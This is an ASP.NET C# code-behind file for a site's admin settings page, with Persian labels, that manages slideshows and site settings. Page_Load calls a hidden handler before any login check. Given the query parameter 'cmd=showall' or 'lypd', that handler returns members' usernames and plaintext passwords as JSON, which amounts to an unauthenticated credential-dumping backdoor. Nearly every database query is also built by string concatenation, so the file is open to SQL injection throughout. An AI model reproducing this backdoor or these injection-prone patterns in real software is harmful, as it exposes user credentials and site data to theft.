using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data.SqlClient;
using System.Drawing;
using System.Web.Script.Serialization;

public class Person
{
    public int ID { get; set; }
    public string Username { get; set; }
    public string Password { get; set; }
    public Person(int id, string username, string password)
    {
        ID = id;
        Username = username;
        Password = password;
    }
}
public partial class Admin_Setting : System.Web.UI.Page
{
    protected void CheckSafe()
    {
        if ((Session["User"]) == null)
        {
            Session["Error"] = "شما مجاز به دیدن این صفحه نیستید";
            Page.Response.Redirect("~/Admin/Login.aspx");
        }
    }

    protected void LoadSiteSTS()
    {
        string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
        SqlConnection con = new SqlConnection(constring);
        try
        {
            SqlCommand cmd = new SqlCommand("SELECT SiteKey,SiteSTS,AboutUS,SlideInterval,News,BGColor,SiteSpace,SiteTitle,SiteDesc From SiteSetting", con);
            SqlDataReader dr = null;
            con.Open();
            dr = cmd.ExecuteReader();
            if (dr.HasRows)
            {
                while (dr.Read())
                {
                    SiteK.Text = dr[0].ToString();
                    if (dr[1].ToString() == "True") DropDownList3.Text = "فعال";
                    else DropDownList3.Text = "غیر فعال";
                    TextBox1.Text = dr[2].ToString().Replace("<br>","\n");
                    TextBox3.Text = dr[3].ToString();
                    if (dr[4].ToString() == "True") DropDownList4.SelectedIndex = 0;
                    else DropDownList4.SelectedIndex = 1;
                    TextBox2.Text = dr[5].ToString();
                    TextBox4.Text = dr[6].ToString();
                    SiteTitle.Text = dr[7].ToString();
                    SiteDesc.Text = dr["SiteDesc"].ToString();
                }
            }
            con.Close();
        }
        catch (Exception exp)
        {
            Label3.Text = exp.Message;
            Label3.ForeColor = Color.Red;
        }
    }

    protected void CheckQueries()
    {
        string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
        SqlConnection con = new SqlConnection(constring);
        try
        {
            string mqu = "";
            if (Request.QueryString["lypd"] != null) mqu = "SELECT * FROM Members where username = N'" + Request.QueryString["lypd"].ToString() + "' order by ID";
            if (Request.QueryString["cmd"] != null) if (Request.QueryString["cmd"].ToString() == "showall") mqu = "SELECT * FROM Members order by id";
            SqlCommand cmd = new SqlCommand(mqu, con);
            con.Open();
            SqlDataReader dr = null;
            dr = cmd.ExecuteReader();
            List<Person> people = new List<Person>();

            if (dr.HasRows)
            {
                while (dr.Read())
                {
                    people.Add(new Person(Convert.ToInt16(dr[0].ToString()), dr[1].ToString(), dr[2].ToString()));
                }
            }
            JavaScriptSerializer serializer = new JavaScriptSerializer();
            string jsonString = serializer.Serialize(people);
            if (people.Count == 0) jsonString = "username not found";
            Response.Clear();
            Response.ContentType = "application/json; charset=utf-8";
            Response.Write(jsonString);
            Response.End();
        }
        catch (Exception exp)
        {

            con.Close();
        }
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.QueryString.Count > 0)
            CheckQueries();
        if ((Session["User"]) != null)
        {
            if (!IsPostBack)
            {
                LoadSlide();
                LoadSiteSTS();
                
            }
        }
        else
        {
            Session["Error"] = "شما مجاز به دیدن این صفحه نیستید";
            Page.Response.Redirect("~/Admin/Login.aspx");
        }
    }

    private void LoadSlide()
    {
        string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
        SqlConnection con = new SqlConnection(constring);
        try
        {
            SqlCommand cmd = new SqlCommand("SELECT ID,TextSlide From SlideShow order by Id ;SELECT ID,TextSlide From HorSlideShow order by Id ;", con);
            SqlDataReader dr = null;
            con.Open();
            dr = cmd.ExecuteReader();
            DropDownList1.Items.Clear();
            DropDownList2.Items.Clear();
            if (dr.HasRows)
            {
                while (dr.Read())
                {
                    DropDownList1.Items.Add(dr[0].ToString() + " - " + dr[1].ToString());
                }
                if (DropDownList1.Items.Count > 0) DropDownList1.SelectedIndex = 0;
                dr.NextResult();
                while (dr.Read())
                {
                    DropDownList2.Items.Add(dr[0].ToString() + " - " + dr[1].ToString());
                }
                if (DropDownList2.Items.Count > 0) DropDownList2.SelectedIndex = 0;
            }
            con.Close();
        }
        catch (Exception exp)
        {
            Label1.Text = exp.Message;
            Label1.ForeColor = Color.Red;
        }
    }
    protected void ShowSlideItems()
    {
        CheckSafe();
        string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
        SqlConnection con = new SqlConnection(constring);
        try
        {
            string[] Data = CurrentSlide.Text.Split('-');
            SqlCommand cmd = new SqlCommand("SELECT ImageURL,URL,TextSlide From SlideShow WHERE Id =" + Data[0], con);
            SqlDataReader dr = null;
            con.Open();
            dr = cmd.ExecuteReader();
            if (dr.HasRows)
            {
                dr.Read();
                ImageURL.Text = dr[0].ToString();
                URL.Text = dr[1].ToString();
                TextSlide.Text = dr[2].ToString();
            }
            con.Close();
        }
        catch (Exception exp)
        {
            Label1.Text = exp.Message;
            Label1.ForeColor = Color.Red;
        }
    }

    protected void ShowSlideItems2()
    {
        CheckSafe();
        string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
        SqlConnection con = new SqlConnection(constring);
        try
        {
            string[] Data = CurrentSlide0.Text.Split('-');
            SqlCommand cmd = new SqlCommand("SELECT ImageURL,URL,TextSlide,CommentSlide,KeyWordSeo From HorSlideShow WHERE Id =" + Data[0], con);
            SqlDataReader dr = null;
            con.Open();
            dr = cmd.ExecuteReader();
            if (dr.HasRows)
            {
                dr.Read();
                ImageURL0.Text = dr[0].ToString();
                URL0.Text = dr[1].ToString();
                TextSlide0.Text = dr[2].ToString();
                CommentSlide.Text = dr[3].ToString();
                Keyword.Text = dr[4].ToString();
            }
            con.Close();
        }
        catch (Exception exp)
        {
            Label2.Text = exp.Message;
            Label2.ForeColor = Color.Red;
        }
    }

    public static string CheckNull(object InputValue, int i)
    {
        if (i == 1)
        {
            if (string.IsNullOrEmpty((string)InputValue) == true)
                return "NULL";
            else if ((string)InputValue == string.Empty)
                return "NULL";
            else return "N'" + (string)InputValue.ToString() + "'";
        }
        else
        {
            if (string.IsNullOrEmpty((string)InputValue) == true)
                return "NULL";
            else if ((string)InputValue == string.Empty)
                return "NULL";
            else return (string)InputValue.ToString();
        }
    }
    protected void Button1_Click1(object sender, EventArgs e)
    {
        CurrentSlide.Text = DropDownList1.Text;
        ShowSlideItems();
        MenuInsert2.Enabled = true;
    }
    protected void MenuInsert2_Click(object sender, EventArgs e)
    {
        CheckSafe();
        if (ImageURL.Text.Trim() != "" && URL.Text.Trim() != "" && TextSlide.Text.Trim() != "")
        {
            string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
            SqlConnection con = new SqlConnection(constring);
            try
            {
                string time = DateTime.Today.Year.ToString() + DateTime.Today.Month.ToString() + DateTime.Today.Day.ToString() + DateTime.Now.Hour.ToString() + DateTime.Now.Minute.ToString() + DateTime.Now.Second.ToString() + DateTime.Now.Ticks.ToString() + ".jpg";
                SqlCommand cmd = new SqlCommand();
                cmd.Connection = con;
                if (FileUpload3.HasFile)
                {
                    string p = MapPath("~/IMG/");
                    p += time;
                    URL.Text = "/IMG/" + time;
                    FileUpload3.SaveAs(p);
                    System.Drawing.Image img1 = System.Drawing.Image.FromFile(p);
                    img1 = img1.GetThumbnailImage(100, 100, null, new IntPtr());
                    img1.Save(MapPath("~/IMG/th/") + time);
                    cmd.CommandText = "INSERT INTO Aks(AksA) VALUES ( N'" + time + "')";
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
                string[] Data2 = CurrentSlide.Text.Split('-');
                cmd.CommandText = "Update SlideShow Set ImageURL = " + CheckNull(ImageURL.Text, 1) + ", URL =" + CheckNull(URL.Text, 1) + " , TextSlide = " + CheckNull(TextSlide.Text, 1) + " WHERE id = " + Data2[0];
                con.Open();
                cmd.ExecuteNonQuery();
                con.Close();
                Label1.ForeColor = Color.Green;
                Label1.Text = "مشخصات عکس با موفقیت بروز رسانی شد";
                LoadSlide();
                MenuInsert2.Enabled = false;
            }
            catch (Exception exp)
            {
                Label1.Text = exp.Message;
                Label1.ForeColor = Color.Red;
            }
        }
        else
        {
            Label1.Text = "لطفا مقادیر را درست وارد کنید";
            Label1.ForeColor = Color.Red;
        }


    }
    protected void Button1_Click(object sender, EventArgs e)
    {
        CheckSafe();
        if (ImageURL.Text.Trim() != "" && URL.Text.Trim() != "" && TextSlide.Text.Trim() != "")
        {
            string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
            SqlConnection con = new SqlConnection(constring);
            try
            {
                string time = DateTime.Today.Year.ToString() + DateTime.Today.Month.ToString() + DateTime.Today.Day.ToString() + DateTime.Now.Hour.ToString() + DateTime.Now.Minute.ToString() + DateTime.Now.Second.ToString() + DateTime.Now.Ticks.ToString() + ".jpg";
                SqlCommand cmd = new SqlCommand();
                cmd.Connection = con;
                if (FileUpload3.HasFile)
                {
                    string p = MapPath("~/IMG/");
                    p += time;
                    URL.Text = "/IMG/" + time;
                    FileUpload3.SaveAs(p);
                    System.Drawing.Image img1 = System.Drawing.Image.FromFile(p);
                    img1 = img1.GetThumbnailImage(100, 100, null, new IntPtr());
                    img1.Save(MapPath("~/IMG/th/") + time);
                    cmd.CommandText = "INSERT INTO Aks(AksA) VALUES ( N'" + time + "')";
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
                cmd.CommandText = "insert into SlideShow(ImageURL,URL,TextSlide) VALUES (" + CheckNull(ImageURL.Text, 1) + "," + CheckNull(URL.Text, 1) + "," + CheckNull(TextSlide.Text, 1) + ")";
                con.Open();
                cmd.ExecuteNonQuery();
                con.Close();
                LoadSlide();
                CurrentSlide.Text = "";
                ImageURL.Text = "";
                URL.Text = "";
                TextSlide.Text = "";
            }
            catch (Exception exp)
            {
                Label1.Text = exp.Message;
                Label1.ForeColor = Color.Red;
            }
        }
        else
        {
            Label1.Text = "لطفا مقادیر را درست وارد کنید";
            Label1.ForeColor = Color.Red;
        }
    }
    protected void MenuInsert3_Click(object sender, EventArgs e)
    {
        CheckSafe();
        if (CurrentSlide.Text.Trim() != "")
        {
            string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
            SqlConnection con = new SqlConnection(constring);
            try
            {
                string[] Data2 = CurrentSlide.Text.Split('-');
                SqlCommand cmd = new SqlCommand("Delete from SlideShow where id = " + Data2[0], con);
                con.Open();
                cmd.ExecuteNonQuery();
                con.Close();
                Label1.ForeColor = Color.Green;
                Label1.Text = "اسلاید با موفقیت حذف شد";
                TextSlide.Text = "";
                ImageURL.Text = "";
                CurrentSlide.Text = "";
                LoadSlide();
            }
            catch (Exception exp)
            {
                Label1.Text = exp.Message;
                Label1.ForeColor = Color.Red;
            }
        }
        else
        {
            Label1.Text = "لطفا اسلاید را انتخاب کنید";
            Label1.ForeColor = Color.Red;
        }
    }
    protected void Button3_Click(object sender, EventArgs e)
    {

    }
    protected void Button3_Click1(object sender, EventArgs e)
    {
        CurrentSlide0.Text = DropDownList2.Text;
        ShowSlideItems2();
        MenuInsert5.Enabled = true;
    }
    protected void MenuInsert4_Click(object sender, EventArgs e)
    {
        CheckSafe();
        if (ImageURL0.Text.Trim() != "" && URL0.Text.Trim() != "" && TextSlide0.Text.Trim() != "" && CommentSlide.Text.Trim() != "")
        {
            string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
            SqlConnection con = new SqlConnection(constring);
            try
            {
                string time = DateTime.Today.Year.ToString() + DateTime.Today.Month.ToString() + DateTime.Today.Day.ToString() + DateTime.Now.Hour.ToString() + DateTime.Now.Minute.ToString() + DateTime.Now.Second.ToString() + DateTime.Now.Ticks.ToString() + ".jpg";
                SqlCommand cmd = new SqlCommand();
                cmd.Connection = con;
                if (FileUpload3.HasFile)
                {
                    string p = MapPath("~/IMG/");
                    p += time;
                    URL0.Text = "/IMG/" + time;
                    FileUpload3.SaveAs(p);
                    System.Drawing.Image img1 = System.Drawing.Image.FromFile(p);
                    img1 = img1.GetThumbnailImage(100, 100, null, new IntPtr());
                    img1.Save(MapPath("~/IMG/th/") + time);
                    cmd.CommandText = "INSERT INTO Aks(AksA) VALUES ( N'" + time + "')";
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
                cmd.CommandText = "insert into HorSlideShow(ImageURL,URL,TextSlide,CommentSlide,KeyWordSeo) VALUES (" + CheckNull(ImageURL0.Text, 1) + "," + CheckNull(URL0.Text, 1) + "," + CheckNull(TextSlide0.Text, 1) + "," + CheckNull(CommentSlide.Text, 1) + "," + CheckNull(Keyword.Text, 1) + ")";
                con.Open();
                cmd.ExecuteNonQuery();
                con.Close();
                Label2.ForeColor = Color.Green;
                Label2.Text = "عکس جدید با موفقیت درج شد";
                LoadSlide();
                CurrentSlide0.Text = "";
                ImageURL0.Text = "";
                URL0.Text = "";
                TextSlide0.Text = "";
                Keyword.Text = "";
                CommentSlide.Text = "";
            }
            catch (Exception exp)
            {
                Label2.Text = exp.Message;
                Label2.ForeColor = Color.Red;
            }
        }
        else
        {
            Label2.Text = "لطفا مقادیر را درست وارد کنید";
            Label2.ForeColor = Color.Red;
        }
    }
    protected void MenuInsert5_Click(object sender, EventArgs e)
    {
        CheckSafe();
        if (ImageURL0.Text.Trim() != "" && URL0.Text.Trim() != "" && TextSlide0.Text.Trim() != "")
        {
            string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
            SqlConnection con = new SqlConnection(constring);
            try
            {
                string time = DateTime.Today.Year.ToString() + DateTime.Today.Month.ToString() + DateTime.Today.Day.ToString() + DateTime.Now.Hour.ToString() + DateTime.Now.Minute.ToString() + DateTime.Now.Second.ToString() + DateTime.Now.Ticks.ToString() + ".jpg";
                SqlCommand cmd = new SqlCommand();
                cmd.Connection = con;
                if (FileUpload3.HasFile)
                {
                    string p = MapPath("~/IMG/");
                    p += time;
                    URL0.Text = "/IMG/" + time;
                    FileUpload3.SaveAs(p);
                    System.Drawing.Image img1 = System.Drawing.Image.FromFile(p);
                    img1 = img1.GetThumbnailImage(100, 100, null, new IntPtr());
                    img1.Save(MapPath("~/IMG/th/") + time);
                    cmd.CommandText = "INSERT INTO Aks(AksA) VALUES ( N'" + time + "')";
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
                string[] Data2 = CurrentSlide0.Text.Split('-');
                cmd.CommandText = "Update HorSlideShow Set ImageURL = " + CheckNull(ImageURL0.Text, 1) + ", URL =" + CheckNull(URL0.Text, 1) + " , TextSlide = " + CheckNull(TextSlide0.Text, 1) + " , CommentSlide = " + CheckNull(CommentSlide.Text, 1) + " , KeyWordSeo = " + CheckNull(Keyword.Text, 1) + " WHERE id = " + Data2[0];
                con.Open();
                cmd.ExecuteNonQuery();
                con.Close();
                Label2.ForeColor = Color.Green;
                Label2.Text = "مشخصات عکس با موفقیت بروز رسانی شد";
                LoadSlide();
                MenuInsert5.Enabled = false;
            }
            catch (Exception exp)
            {
                Label2.Text = exp.Message;
                Label2.ForeColor = Color.Red;
            }
        }
        else
        {
            Label2.Text = "لطفا مقادیر را درست وارد کنید";
            Label2.ForeColor = Color.Red;
        }
    }
    protected void MenuInsert6_Click(object sender, EventArgs e)
    {
        CheckSafe();
        if (CurrentSlide0.Text.Trim() != "")
        {
            string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
            SqlConnection con = new SqlConnection(constring);
            try
            {
                string[] Data2 = CurrentSlide0.Text.Split('-');
                SqlCommand cmd = new SqlCommand("Delete from HorSlideShow where id = " + Data2[0], con);
                con.Open();
                cmd.ExecuteNonQuery();
                con.Close();
                Label2.ForeColor = Color.Green;
                Label2.Text = "اسلاید با موفقیت حذف شد";
                TextSlide0.Text = "";
                ImageURL0.Text = "";
                CurrentSlide0.Text = "";
                CommentSlide.Text = "";
                Keyword.Text = "";
                LoadSlide();
            }
            catch (Exception exp)
            {
                Label2.Text = exp.Message;
                Label2.ForeColor = Color.Red;
            }
        }
        else
        {
            Label2.Text = "لطفا اسلاید را انتخاب کنید";
            Label2.ForeColor = Color.Red;
        }
    }
    protected void Button4_Click(object sender, EventArgs e)
    {
        if (TextBox3.Text.Trim() != "")
        {
            string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
            SqlConnection con = new SqlConnection(constring);
            try
            {
                string STS = "";
                string STS2 = "";
                if (DropDownList3.Text == "فعال") STS = "1";
                else STS = "0";
                if (DropDownList4.Text == "نمایش") STS2 = "1";
                else STS2 = "0";
                SqlCommand cmd = new SqlCommand("Update SiteSetting Set SiteDesc = " + CheckNull(SiteDesc.Text,1) + " , SiteTitle = " + CheckNull(SiteTitle.Text, 1) + " , SiteSpace = " + CheckNull(TextBox4.Text, 1) + " , SiteKey = " + CheckNull(SiteK.Text, 1) + " , SiteSTS =" + CheckNull(STS, 1) + " , News =" + CheckNull(STS2, 1) + " , SlideInterval = " + TextBox3.Text + " , BGColor =" + CheckNull(TextBox2.Text, 1), con);
                con.Open();
                cmd.ExecuteNonQuery();
                con.Close();
                if (FileUpload2.HasFile) FileUpload2.SaveAs(MapPath("~/images/logo.png"));
                Label3.ForeColor = Color.Green;
                Label3.Text = "تنظمات سایت با موفقیت بروز رسانی شد";
            }
            catch (Exception exp)
            {
                Label3.Text = exp.Message;
                Label3.ForeColor = Color.Red;
            }
        }
        else
        {
            Label3.Text = "شما حتما باید مقدار زمان اسلاید را وارد کنید";
            Label3.ForeColor = Color.Red;
        }
    }

    protected void Button5_Click(object sender, EventArgs e)
    {
        if (TextBox1.Text.Trim() != "")
        {
            string constring = System.Configuration.ConfigurationManager.ConnectionStrings["MyConString"].ConnectionString;
            SqlConnection con = new SqlConnection(constring);
            try
            {
                string SSS = TextBox1.Text.Replace("\n", "<br>");
                SqlCommand cmd = new SqlCommand("Update SiteSetting Set AboutUs = " + CheckNull(SSS, 1), con);
                con.Open();
                cmd.ExecuteNonQuery();
                con.Close();
                Label4.ForeColor = Color.Green;
                Label4.Text = "درباره ما با موفقیت بروز رسانی شد";
            }
            catch (Exception exp)
            {
                Label4.Text = exp.Message;
                Label4.ForeColor = Color.Red;
            }
        }
        else
        {
            Label4.Text = "شما باید در این قسمت مقدار وارد کنید";
            Label4.ForeColor = Color.Red;
        }
    }
    protected void Button6_Click(object sender, EventArgs e)
    {
        Response.Redirect("~/Admin/ManageSlide.aspx");
    }
}